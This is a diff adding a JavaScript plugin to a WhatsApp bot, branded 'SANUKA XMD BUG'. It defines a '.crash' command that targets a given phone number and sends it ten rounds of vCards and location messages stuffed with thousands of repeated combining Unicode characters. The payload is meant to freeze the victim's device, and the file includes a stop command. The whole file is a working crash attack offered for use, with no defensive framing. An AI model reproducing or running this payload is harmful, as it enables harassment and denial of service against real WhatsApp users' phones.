@@ -1,0 +1,89 @@
+const { cmd } = require('../command');
+
+let isAttacking = false;
+
+cmd({
+    pattern: "crash",
+    alias: ["dead", "sanukabug"],
+    desc: "SANUKA XMD BUG - Powerful WhatsApp Crash",
+    category: "owner",
+    react: "💀",
+    filename: __filename
+},
+async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
+    try {
+        // Owner check only for .crash
+        const authorizedNumbers = ['947xxxxxxxxx']; // ← CHANGE TO YOUR NUMBER
+        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;
+        
+        if (!isAuthorized) return reply("❌ Only owner can use .crash command");
+
+        if (!args[0] && !m.quoted) return reply("𝐍𝐞𝐞𝐝 𝐖𝐩 𝐍𝐮𝐦𝐛𝐞𝐫 ! ❌\nExample: .crash 947xxxxxxxx");
+
+        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+        if (isAttacking) return reply("⚠️ An attack is already running. Use `.sbug` to stop.");
+
+        isAttacking = true;
+
+        await reply("☣️ *SANUKA XMD BUG*\nDeploying High-Power Crash Payload... 🚀");
+
+        // SANUKA XMD BUG VCard
+        const vcard = 'BEGIN:VCARD\n' +
+            'VERSION:3.0\n' +
+            'FN:SANUKA XMD BUG 💀\n' +
+            'ORG:SANUKA XMD;\n' +
+            'TEL;type=CELL;type=VOICE;waid=947xxxxxxxx:+94 71 234 5678\n' +
+            'X-ABLabel:' + "\u0345\u0361\u0345".repeat(2000) + '\n' + 
+            'END:VCARD';
+
+        const locPayload = {
+            degreesLatitude: 24.121231,
+            degreesLongitude: 55.112122,
+            name: "SANUKA XMD BUG ☣️\n" + "҉".repeat(2000),
+            address: "\u0345\u0361\u0345".repeat(1000)
+        };
+
+        for (let i = 0; i < 10; i++) {
+            if (!isAttacking) break;
+
+            await conn.sendMessage(target, {
+                contacts: {
+                    displayName: 'SANUKA XMD BUG ☣️',
+                    contacts: [{ vcard }]
+                }
+            }, { quoted: mek });
+
+            await conn.sendMessage(target, {
+                location: locPayload
+            }, { quoted: mek });
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+
+        isAttacking = false;
+        await reply("✅ *SUCCESS:* Target device should now be frozen.\nCheck status! 💀");
+
+    } catch (e) {
+        isAttacking = false;
+        console.log("SANUKA XMD BUG Error: ", e.message);
+        await reply("❌ Error occurred while deploying crash.");
+    }
+});
+
+// ===================== EMERGENCY STOP COMMAND =====================
+// This command is available to everyone (not only owner)
+cmd({
+    pattern: "sbug",
+    alias: ["stopbug", "stop"],
+    desc: "Emergency Stop All Crash Attacks",
+    category: "misc",
+    filename: __filename
+}, async (conn, mek, m, { reply }) => {
+    if (isAttacking) {
+        isAttacking = false;
+        await reply("🛑 *Emergency Stop Activated*\nAll SANUKA XMD BUG attacks have been stopped.");
+    } else {
+        await reply("✅ No crash attack is currently running.");
+    }
+});
